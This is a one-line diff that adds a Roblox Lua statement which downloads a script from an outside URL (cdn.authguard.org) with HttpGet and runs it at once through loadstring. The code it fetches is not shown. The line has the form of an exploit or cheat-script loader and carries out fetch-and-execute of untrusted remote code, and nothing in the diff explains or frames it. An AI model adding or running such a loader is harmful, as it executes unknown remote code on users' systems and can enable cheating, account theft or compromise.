@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://cdn.authguard.org/virtual-file/c4e2c04cbdbe450d9bc6b7adf436e41b"))()
